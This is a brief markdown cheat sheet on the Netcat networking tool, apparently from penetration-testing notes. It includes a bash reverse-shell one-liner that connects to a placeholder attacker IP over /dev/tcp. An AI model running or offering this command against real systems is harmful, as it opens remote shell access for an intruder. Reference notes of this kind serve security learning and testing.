# 📡 Netcat (nc)

## Description
Netcat is a networking utility for reading/writing to network connections using TCP/UDP.

## Basic Usage
```bash
nc -nv 10.10.10.5 4444
```

## Reverse Shell
```bash
bash -i >& /dev/tcp/attacker_ip/4444 0>&1
```

## Use Case
- Banner grabbing
- Port listening
- Reverse shells
